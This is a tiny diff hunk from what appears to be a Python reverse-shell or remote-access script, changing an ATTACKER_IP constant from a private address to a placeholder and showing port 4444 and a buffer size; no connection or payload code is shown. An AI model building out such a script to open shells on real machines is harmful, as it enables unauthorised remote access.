@@ -5,7 +5,7 @@ import ctypes
 import time
 
 
-ATTACKER_IP = "192.168.0.3"
+ATTACKER_IP = "IP ATTACKER"
 PORT = 4444
 BUFFER_SIZE = 8192
 
